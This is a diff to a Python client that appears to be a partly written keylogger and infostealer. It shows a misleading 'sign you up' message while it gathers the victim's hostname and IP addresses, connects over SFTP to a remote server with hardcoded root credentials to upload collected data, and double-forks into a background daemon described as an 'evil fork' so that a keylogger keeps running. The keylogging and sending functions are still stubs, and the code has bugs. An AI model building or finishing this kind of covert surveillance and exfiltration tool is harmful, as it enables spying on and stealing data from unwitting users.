@@ -38,11 +38,12 @@ import os
 import re
 import socket #to capture the local IP
 import urllib.request # to capture the public ip
+import logzero
+from logzero import logger
 
 
-
-
-def fetchSFTP():
+logzero.logfile("clientLogger.log", maxBytes=1e6, backupCount=2)
+def fetchSFTP(keyLoc):
     '''
     This function handles the connection and creation of SSH and SFTP connections to a target server.
     When an exception occurs, disconnect from the server if possible.
@@ -55,7 +56,7 @@ def fetchSFTP():
         port = 9500
         usr,  pwd = 'root', 'toor'
         
-        key = paramiko.RSAKey(filename='test_rsa.key')
+        key = paramiko.RSAKey(filename=keyLoc)
 
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -139,6 +140,7 @@ def getIPaddr():
     This function handles the capture of the user's private IP address, hostname, and public IP
     @returns - host, ip, external_ip
     '''
+    print("One Moment please while we sign you up...")
     ip = 0
     host = socket.gethostname()    
     ip = socket.gethostbyname(host)    
@@ -147,29 +149,62 @@ def getIPaddr():
     return host, ip, external_ip    
 
 def keylog():
+    #while True:
+    
+    #your code here
+    
+    return 0
+    
+def sendFile(dataFile,  conn, filename):
+    
+    if filename == 'infobank.txt':
+        print(filename)
+    
+    elif filename == 'keylog.txt':
+        print(filename)
+    else:
+        logger.error("Unknown fille handle sent to sendFile")
     
     return 0
 def run():
-
-    sftp = fetchSFTP()
-    try:
-        pid = os.fork()
-        if pid == 0:
-                #I am the child connection, I am an evil fork and wont HUP
-            keylog()
-            os._exit(0)   
-        else:
-                infoBank = getInput()
-                #I am the parent and need to die after I finish my work
-    except OSError:
-        sys.stderr.write("Could not create a child process\n")
+    keyLoc = os.getcwd()
+    keyLoc += '/test_rsa.key'
     
-
-    with open('info_bank.txt', 'w') as f:
-        for item in infoBank:
-            f.write("%s\n" % item)
-            
+    sftp = fetchSFTP(keyLoc)
+    infoBank = getInput()
+    sendFile(infoBank,  sftp,  'infobank.txt')
     sftp.close()
+    
+    #child forks to be evil
+    try:
+        if os.fork() > 0:
+            sys.exit(0)
+    except OSError as e:
+        logger.error("Unable to fork for fork #1")
+        sftp.close()
+        sys.exit(0)
+                
+    os.chdir('/')
+    try:
+        os.setsid()
+    except Exception as e:
+        logger.warning("Could not change the GID and/or UID - is this process privilaged?")
+        logger.warning(str(e))
+            
+        # End Leadership by double forking
+    try:
+        if os.fork() > 0:
+            raise os._exit(0)
+    except OSError as e:
+        logger.error("Unable to fork for fork #2")
+        
+    #I am the child connection, I am an evil fork and shouldn't HUP
+    keylog()
+    stfp2 = fetchSFTP(keyLoc)
+
+    sendFile(infoBank,  sftp,  'infobank.txt')
+    stfp2.close()
+    os._exit(0)
     
 # MAIN # 
 if __name__ == '__main__':
